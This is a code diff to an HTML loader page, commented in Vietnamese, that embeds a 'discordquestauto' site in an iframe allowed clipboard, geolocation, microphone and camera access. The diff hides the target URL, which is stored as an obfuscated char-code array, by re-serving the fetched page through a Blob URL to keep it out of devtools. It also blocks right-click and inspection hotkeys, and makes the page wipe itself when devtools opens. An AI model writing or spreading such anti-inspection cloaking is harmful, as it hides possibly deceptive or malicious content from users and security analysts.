@@ -89,6 +89,7 @@
     <div class="orb orb-2"></div>
     <div class="orb orb-3"></div>
     <div class="orb orb-4"></div>
+    <!-- Để src="about:blank" để che link trên Elements, sẽ dùng JS inject Blob URL -->
     <iframe id="content-frame" src="about:blank" allow="clipboard-read; clipboard-write; geolocation; microphone; camera"></iframe>
     <div id="loader">
         <div class="logo-wrapper">
@@ -119,9 +120,16 @@
 
     <script>
     (function(){
-        // Mã hóa link gốc dưới dạng mảng số (Char Code)
+        // Mã hóa link gốc
         var _0x=[104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,113,117,101,115,116,97,117,116,111,46,115,112,97,99,101,45,122,46,97,105,47];
         var target=_0x.map(function(c){return String.fromCharCode(c)}).join('');
+
+        // Hàm tự kill bản thân và ngắt kết nối ngay lập tức
+        var _kill=function(){
+            try { document.getElementById('content-frame').src = 'about:blank'; } catch(e){}
+            document.body.innerHTML='';
+            window.location.replace('about:blank');
+        };
 
         // 1. Chống Click chuột phải
         document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
@@ -131,7 +139,7 @@
             if(e.keyCode==123||(e.ctrlKey&&(e.shiftKey&&(e.keyCode==73||e.keyCode==74)||e.keyCode==85)))return false;
         };
 
-        // 3. Phát hiện DevTool mở (cả PC và Mobile) -> Reload trang ngay lập tức
+        // 3. Phát hiện DevTool mở (cả PC và Mobile) -> Kill bản thân
         var threshold = 160;
         var initW = window.outerWidth - window.innerWidth > threshold;
         var initH = window.outerHeight - window.innerHeight > threshold;
@@ -139,9 +147,8 @@
         setInterval(function(){
             var currW = window.outerWidth - window.innerWidth > threshold;
             var currH = window.outerHeight - window.innerHeight > threshold;
-            // Nếu kích thước chênh lệch đột ngột thay đổi (do mở tool docked/undocked)
             if(currW !== initW || currH !== initH){
-                window.location.reload(); 
+                _kill(); // Phát hiện -> Tự diệt
             }
         }, 500);
 
@@ -211,7 +218,6 @@
         }
         loop();
 
-        // Thêm dấu tiếng Việt cho thông báo loader
         var msgs=['Đang kết nối đến máy chủ','Đang xác thực dữ liệu','Đang tải tài nguyên','Đang khởi chạy hệ thống'];
         var si=0;
         function cycle(){
@@ -226,14 +232,34 @@
             cycle();
             var frame=document.getElementById('content-frame');
             var loader=document.getElementById('loader');
-            frame.src=target;
-            frame.onload=function(){
-                setTimeout(function(){
-                    loader.classList.add('fade-out');
-                    frame.style.display='block';
-                    requestAnimationFrame(function(){frame.classList.add('visible')});
-                },500);
-            };
+            
+            // Kỹ thuật ẩn link khỏi Sources và Elements bằng Blob URL
+            fetch(target)
+                .then(function(response) { return response.text(); })
+                .then(function(html) {
+                    var blob = new Blob([html], { type: 'text/html' });
+                    var blobUrl = URL.createObjectURL(blob);
+                    frame.src = blobUrl;
+                    
+                    frame.onload = function(){
+                        setTimeout(function(){
+                            loader.classList.add('fade-out');
+                            frame.style.display='block';
+                            requestAnimationFrame(function(){frame.classList.add('visible')});
+                        },500);
+                    };
+                })
+                .catch(function(err) {
+                    // Dự phòng nếu server chặn CORS
+                    frame.src = target;
+                    frame.onload = function(){
+                        setTimeout(function(){
+                            loader.classList.add('fade-out');
+                            frame.style.display='block';
+                            requestAnimationFrame(function(){frame.classList.add('visible')});
+                        },500);
+                    };
+                });
         });
     })();
     </script>
